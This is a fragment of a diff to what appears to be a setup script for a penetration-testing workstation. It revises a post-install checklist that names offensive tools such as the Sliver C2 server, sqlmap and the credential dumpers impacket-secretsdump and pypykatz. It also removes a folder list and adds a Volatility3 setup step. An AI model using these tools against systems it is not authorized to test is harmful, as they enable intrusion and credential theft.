   □ source ~/.zshrc
-  □ bw login                          (Bitwarden CLI)
+  □ brew doctor
   □ shodan init <API_KEY>
-  □ sudo sliver-server                (test Sliver C2)
-  □ vol3 --help                       (test Volatility3)
-  □ which nmap ffuf nuclei subfinder httpx sqlmap rustscan dalfox
-  □ which impacket-secretsdump pypykatz netexec certipy
-
-USEFUL FOLDERS:
-  ~/labs            CTF and lab workspaces
-  ~/tools           Cloned repos and custom tools
-  ~/wordlists       SecLists, assetnote, and other wordlists
-  ~/reports         Pentest / bug bounty reports
-  ~/screenshots     Evidence and findings
-  ~/memory-dumps    Volatility3 analysis targets
-  ~/pcaps           Packet captures for Wireshark/Zeek/Suricata
-  ~/malware-samples Malware analysis (isolate in VM when running)
+  □ bw login
+  □ sudo sliver-server
+  □ vol3 --help
+  □ sherlock --help
+  □ which nmap ffuf nuclei subfinder httpx sqlmap rustscan
 
 EOF
 }
@@ -874,6 +932,7 @@ main() {
   install_manual_tools
   clone_repos
   setup_gf_patterns
+  setup_volatility3
   write_shell_config
   finalize_tools
   manual_notes
